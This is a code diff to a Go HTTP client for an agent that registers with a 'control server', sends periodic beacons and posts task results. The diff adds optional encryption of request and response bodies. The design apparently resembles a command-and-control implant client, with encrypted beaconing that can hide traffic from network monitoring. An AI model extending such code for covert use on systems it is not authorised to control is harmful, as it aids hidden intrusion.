@@ -7,13 +7,16 @@ import (
 	"io"
 	"net/http"
 	"time"
+
+	"bytecode-agent/internal/config"
+	"bytecode-agent/internal/crypto"
 )
 
 // Client handles all HTTP communication with the control server
 type Client struct {
-	ServerURL  string
-	APIKey     string
-	httpClient *http.Client
+	Config        *config.Config
+	APIKey        string
+	httpClient    *http.Client
 }
 
 // RegisterRequest is sent to /api/register
@@ -52,9 +55,9 @@ type ResultRequest struct {
 }
 
 // NewClient creates a new HTTP client for server communication
-func NewClient(serverURL string) *Client {
+func NewClient(cfg *config.Config) *Client {
 	return &Client{
-		ServerURL: serverURL,
+		Config: cfg,
 		httpClient: &http.Client{
 			Timeout: 30 * time.Second,
 		},
@@ -73,11 +76,26 @@ func (c *Client) Register(req *RegisterRequest) (*RegisterResponse, error) {
 		return nil, fmt.Errorf("marshal error: %w", err)
 	}
 
-	httpReq, err := http.NewRequest("POST", c.ServerURL+"/api/register", bytes.NewBuffer(body))
+	// Encrypt body if key is present
+	var requestBody []byte
+	if len(c.Config.EncryptionKey) > 0 {
+		encrypted, err := crypto.Encrypt(body, c.Config.EncryptionKey)
+		if err != nil {
+			return nil, fmt.Errorf("encryption error: %w", err)
+		}
+		requestBody = encrypted
+	} else {
+		requestBody = body
+	}
+
+	httpReq, err := http.NewRequest("POST", c.Config.ServerURL+"/api/register", bytes.NewBuffer(requestBody))
 	if err != nil {
 		return nil, fmt.Errorf("request error: %w", err)
 	}
-	httpReq.Header.Set("Content-Type", "application/json")
+	httpReq.Header.Set("Content-Type", "application/octet-stream")
+	if len(c.Config.EncryptionKey) > 0 {
+		httpReq.Header.Set("X-Encrypted", "true")
+	}
 
 	resp, err := c.httpClient.Do(httpReq)
 	if err != nil {
@@ -90,8 +108,25 @@ func (c *Client) Register(req *RegisterRequest) (*RegisterResponse, error) {
 		return nil, fmt.Errorf("registration failed (HTTP %d): %s", resp.StatusCode, string(respBody))
 	}
 
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("read error: %w", err)
+	}
+
+	// Decrypt response if encrypted
+	var decryptedBody []byte
+	if resp.Header.Get("X-Encrypted") == "true" && len(c.Config.EncryptionKey) > 0 {
+		decrypted, err := crypto.Decrypt(respBody, c.Config.EncryptionKey)
+		if err != nil {
+			return nil, fmt.Errorf("decryption error: %w", err)
+		}
+		decryptedBody = decrypted
+	} else {
+		decryptedBody = respBody
+	}
+
 	var regResp RegisterResponse
-	if err := json.NewDecoder(resp.Body).Decode(&regResp); err != nil {
+	if err := json.Unmarshal(decryptedBody, &regResp); err != nil {
 		return nil, fmt.Errorf("decode error: %w", err)
 	}
 
@@ -102,12 +137,27 @@ func (c *Client) Register(req *RegisterRequest) (*RegisterResponse, error) {
 func (c *Client) Beacon() (*BeaconResponse, error) {
 	body := []byte(`{}`)
 
-	httpReq, err := http.NewRequest("POST", c.ServerURL+"/api/beacon", bytes.NewBuffer(body))
+	// Encrypt body
+	var requestBody []byte
+	if len(c.Config.EncryptionKey) > 0 {
+		encrypted, err := crypto.Encrypt(body, c.Config.EncryptionKey)
+		if err != nil {
+			return nil, fmt.Errorf("encryption error: %w", err)
+		}
+		requestBody = encrypted
+	} else {
+		requestBody = body
+	}
+
+	httpReq, err := http.NewRequest("POST", c.Config.ServerURL+"/api/beacon", bytes.NewBuffer(requestBody))
 	if err != nil {
 		return nil, fmt.Errorf("request error: %w", err)
 	}
-	httpReq.Header.Set("Content-Type", "application/json")
+	httpReq.Header.Set("Content-Type", "application/octet-stream")
 	httpReq.Header.Set("X-Agent-Key", c.APIKey)
+	if len(c.Config.EncryptionKey) > 0 {
+		httpReq.Header.Set("X-Encrypted", "true")
+	}
 
 	resp, err := c.httpClient.Do(httpReq)
 	if err != nil {
@@ -120,8 +170,25 @@ func (c *Client) Beacon() (*BeaconResponse, error) {
 		return nil, fmt.Errorf("beacon failed (HTTP %d): %s", resp.StatusCode, string(respBody))
 	}
 
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("read error: %w", err)
+	}
+
+	// Decrypt response
+	var decryptedBody []byte
+	if resp.Header.Get("X-Encrypted") == "true" && len(c.Config.EncryptionKey) > 0 {
+		decrypted, err := crypto.Decrypt(respBody, c.Config.EncryptionKey)
+		if err != nil {
+			return nil, fmt.Errorf("decryption error: %w", err)
+		}
+		decryptedBody = decrypted
+	} else {
+		decryptedBody = respBody
+	}
+
 	var beaconResp BeaconResponse
-	if err := json.NewDecoder(resp.Body).Decode(&beaconResp); err != nil {
+	if err := json.Unmarshal(decryptedBody, &beaconResp); err != nil {
 		return nil, fmt.Errorf("decode error: %w", err)
 	}
 
@@ -135,12 +202,27 @@ func (c *Client) SendResult(result *ResultRequest) error {
 		return fmt.Errorf("marshal error: %w", err)
 	}
 
-	httpReq, err := http.NewRequest("POST", c.ServerURL+"/api/result", bytes.NewBuffer(body))
+	// Encrypt body
+	var requestBody []byte
+	if len(c.Config.EncryptionKey) > 0 {
+		encrypted, err := crypto.Encrypt(body, c.Config.EncryptionKey)
+		if err != nil {
+			return fmt.Errorf("encryption error: %w", err)
+		}
+		requestBody = encrypted
+	} else {
+		requestBody = body
+	}
+
+	httpReq, err := http.NewRequest("POST", c.Config.ServerURL+"/api/result", bytes.NewBuffer(requestBody))
 	if err != nil {
 		return fmt.Errorf("request error: %w", err)
 	}
-	httpReq.Header.Set("Content-Type", "application/json")
+	httpReq.Header.Set("Content-Type", "application/octet-stream")
 	httpReq.Header.Set("X-Agent-Key", c.APIKey)
+	if len(c.Config.EncryptionKey) > 0 {
+		httpReq.Header.Set("X-Encrypted", "true")
+	}
 
 	resp, err := c.httpClient.Do(httpReq)
 	if err != nil {
